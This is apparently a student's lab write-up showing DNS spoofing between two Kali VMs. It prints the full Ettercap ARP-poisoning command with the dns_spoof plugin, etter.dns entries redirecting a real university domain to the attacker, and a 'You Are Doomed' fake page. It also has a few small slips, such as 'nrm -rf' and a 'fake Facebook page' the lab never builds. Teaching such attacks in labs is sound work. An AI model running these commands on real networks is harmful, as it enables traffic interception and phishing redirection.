# 💀 DNS Spoofing Simulation with Ettercap in a Controlled Lab (Kali vs Kali)

> **⚠️ Educational Purpose Only**  
> This project demonstrates a DNS spoofing attack in a **completely isolated lab environment** using **Ettercap** and a fake ```pmiscs.cse.du.ac.bd``` page. Do NOT replicate this outside of a controlled setting.

---

## 🧠 1. Machine Configuration

| Role       | OS        | IP Address      | Description                                |
|------------|-----------|------------------|--------------------------------------------|
| 🛡️ Victim   | Kali Linux | `192.168.219.135` | Regular Kali VM with default network config |
| 🎯 Attacker | Kali Linux | `192.168.219.134` | Runs Ettercap and hosts the fake site       |

<img width="646" alt="Screenshot 2025-05-28 at 12 48 39 PM" src="https://github.com/user-attachments/assets/b6328de8-46b6-43e5-8398-ce40c785bd17" />
<img width="646" alt="Screenshot 2025-05-28 at 12 49 05 PM" src="https://github.com/user-attachments/assets/95314cfc-67c0-4103-b43d-07a409a46283" />


> Both machines are connected via **VMware Bridge Adapter** and can ping each other.

---

## ⚙️ 2. Attack Methodology: DNS Spoof via Ettercap

### 🧩 Tools Used
- `Ettercap`: To perform DNS spoofing in real time
- `Apache2`: To serve the fake Facebook page
- `HTML/CSS`: Custom phishing-style page

---

### 🔥 Attack Flow

1. **Victim browses `pmics.cse.du.ac.bd`** as usual.
2. **Ettercap intercepts the DNS request** on the attacker machine.
3. The attacker **spoofs the DNS reply**, telling the victim that `pmics.cse.du.ac.bd` = `192.168.219.134`.
4. Victim gets redirected to a **fake PMICS site** that says:
   > **"You Are Doomed!"**

---

## 🚀 3. Execution Steps (Attacker Side)

### 📁 Step 1: Set Up the Fake pmics.cse.du.ac.bd Page

Create the page content:

```bash
sudo mkdir -p /var/www/
sudo nrm -rf /var/www/html/index.html
sudo nano /var/www/html/index.html
```
<img width="644" alt="Screenshot 2025-05-28 at 12 52 22 PM" src="https://github.com/user-attachments/assets/f72965a2-5594-42c9-8f61-0b837a5954af" />

Paste the following code:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>You Are Doomed</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: black;
      color: red;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      animation: glitchBackground 2s infinite alternate;
    }

    h1 {
      font-size: 5rem;
      text-shadow: 0 0 10px red;
      animation: glitch 0.5s infinite;
    }

    h2, h3 {
      font-size: 2rem;
      margin: 0.5rem 0;
      text-shadow: 0 0 5px red;
    }

    @keyframes glitch {
      0% {
        transform: translate(0);
      }
      20% {
        transform: translate(-2px, 2px);
      }
      40% {
        transform: translate(2px, -2px);
      }
      60% {
        transform: translate(-1px, 1px);
      }
      80% {
        transform: translate(1px, -1px);
      }
      100% {
        transform: translate(0);
      }
    }

    @keyframes glitchBackground {
      0% {
        background-color: black;
      }
      100% {
        background-color: #0a0a0a;
      }
    }
  </style>
</head>
<body>
  <h1>YOU ARE DOOMED</h1>
  <h2>by Mohtashim Haider</h2>
  <h3>Batch 4, Cybersecurity</h3>
  <h3>University of Dhaka</h3>
</body>
</html>
```
<img width="644" alt="Screenshot 2025-05-28 at 12 51 15 PM" src="https://github.com/user-attachments/assets/68ada88a-0cbb-4647-842e-4945680c8b64" />

Start Apache:
```bash
sudo systemctl start apache2
```
<img width="644" alt="Screenshot 2025-05-28 at 12 53 44 PM" src="https://github.com/user-attachments/assets/9f5583b1-810c-41ec-b944-a0610f6af923" />


## 🧠 Step 2: Configure Ettercap DNS Spoof
2.1 Create a Custom DNS Spoofing Hosts File:
```bash
sudo nano /etc/ettercap/etter.dns
```
<img width="644" alt="Screenshot 2025-05-28 at 12 54 49 PM" src="https://github.com/user-attachments/assets/31f04616-ca79-49a1-848f-f92913bef68d" />

Add the spoof entry:
```bash
pmics.cse.du.ac.bd     A   192.168.219.134
*.pmics.cse.du.ac.bd   A   192.168.219.134
```
```*.pmics.cse.du.ac.bd catches any subdomain like pmics.cse.du.ac.bd```

<img width="644" alt="Screenshot 2025-05-28 at 12 56 44 PM" src="https://github.com/user-attachments/assets/b8fa5237-1e30-4def-8632-e3d1de61353f" />

Before the attack, when victim browses ```pmics.cse.du.ac.bd```:

<img width="1423" alt="Screenshot 2025-05-28 at 1 10 31 PM" src="https://github.com/user-attachments/assets/d536904c-36d8-4170-8cd9-1d0279bfe837" />

## 🧪 Step 3: Launch Ettercap

Run this in terminal:
```bash
sudo ettercap -T -q -M arp:remote /192.168.219.135// /192.168.219.2// -P dns_spoof
```
Explanation:

```-T```: Text mode

```-q```: Quiet

```-M arp```:remote: Man-in-the-middle via ARP poisoning

```/192.168.219.135//```: Victim

```/192.168.219.2//```: Gateway (To find Gateway,type this in the terminal: ```ip route```)

```-P dns_spoof```: Load the DNS spoof plugin

<img width="644" alt="Screenshot 2025-05-28 at 12 57 39 PM" src="https://github.com/user-attachments/assets/bf9163de-3cc5-4491-ab0a-06a31a7a1dd6" />


## 📸 4. Proof of Attack
✅ Successful Execution Steps:
Victim opens Firefox:
```url
pmics.cse.du.ac.bd
```
The result:
The browser loads 192.168.219.134

Apache serves the fake site with a big, bold message:

```YOU ARE DOOMED!```

```by Mohtashim Haider```

```Batch 4, Cybersecurity```

```University of Dhaka```

<img width="1439" alt="Screenshot 2025-05-28 at 1 03 20 PM" src="https://github.com/user-attachments/assets/80032043-58e0-40ca-b7ca-15c2ad3683bc" />


Victim's terminal confirms DNS redirection:

```bash
ping pmics.cse.du.ac.bd
PING pmics.cse.du.ac.bd (192.168.219.134) 56(84) bytes of data.
64 bytes from 192.168.219.134: icmp_seq=1 ttl=64 time=0.287 ms
64 bytes from 192.168.219.134: icmp_seq=2 ttl=64 time=0.330 ms
64 bytes from 192.168.219.134: icmp_seq=3 ttl=64 time=0.324 ms
```
<img width="640" alt="Screenshot 2025-05-28 at 1 04 08 PM" src="https://github.com/user-attachments/assets/5723384d-ba8d-457e-aa8a-aa3ea6a62a46" />

Attacker's Ettercap terminal logs:

```bash
dns_spoof: A [pmics.cse.du.ac.bd] spoofed to [192.168.219.134] TTL [3600 s]
```

<img width="637" alt="Screenshot 2025-05-28 at 1 04 50 PM" src="https://github.com/user-attachments/assets/bf8f1dcd-557b-405c-a41b-cbc265ee129c" />

Video:



https://github.com/user-attachments/assets/01954f0f-6076-427b-9081-98aa7da105ea


---

##  Conclusion
This lab shows how DNS spoofing using Ettercap can mislead a user into trusting a fake site. Although executed in a safe environment, it reflects how critical it is to secure DNS communications.

```"If you control DNS, you control the user's world."```

---

# 🎓 Author 
```MOHTASHIM HAIDER```

```BATCH-4, CYBERSECURITY```

```UNIVERSITY OF DHAKA```
